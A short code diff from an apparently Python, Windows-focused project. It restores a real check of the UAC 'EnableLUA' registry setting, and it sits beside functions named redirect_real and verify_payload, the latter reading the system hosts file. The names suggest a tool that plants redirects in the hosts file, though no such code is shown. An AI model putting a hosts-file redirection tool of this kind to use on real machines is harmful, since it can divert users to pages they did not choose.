@@ -38,8 +38,7 @@ def redirect_real(page):
 def verify_uac() -> bool:
     flag = check_output("reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA".split(' '))
     flag = flag.decode().split("    ")
-    #return not int(flag[-1][:-4], 16) 
-    return True
+    return not int(flag[-1][:-4], 16) 
 
 def verify_payload() -> bool:
     with open(f"{os.environ['HOMEDRIVE']}\\Windows\\System32\\drivers\\etc\\hosts", 'r') as hosts:
